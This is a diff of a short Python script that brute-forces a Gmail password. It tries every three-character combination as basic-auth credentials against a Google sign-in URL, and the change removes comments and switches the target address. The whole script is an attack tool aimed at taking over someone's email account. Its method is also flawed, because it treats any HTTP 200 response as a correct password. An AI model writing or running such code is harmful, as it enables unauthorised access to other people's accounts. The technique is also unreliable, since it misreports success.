@@ -10,16 +10,11 @@ import string
 from getpass import getpass
 from email.mime.text import MIMEText
 
-#asks for gmail adress and creates a loop to guess every possible combination of the password
 gmail = input("Enter your gmail adress: ")
-#creates a list of all possible combinations of the password
 password = list(itertools.product(string.ascii_letters + string.digits, repeat=3))
-#creates a loop to guess every possible combination of the password
 for i in password:
-    #creates a string of the combination of the password
     password = ''.join(i)
-    #sends a request to the gmail adress with the combination of the password
-    response = requests.get("https://mail.google.com/mail/u/0/#inbox", auth=(gmail, password))
+    response = requests.get("https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin", auth=(gmail, password))
     #if the response is 200 the password is correct and the loop is broken
     if response.status_code == 200:
         print("Password is: " + password)
@@ -29,5 +24,4 @@ for i in password:
         continue
 
     
-
 
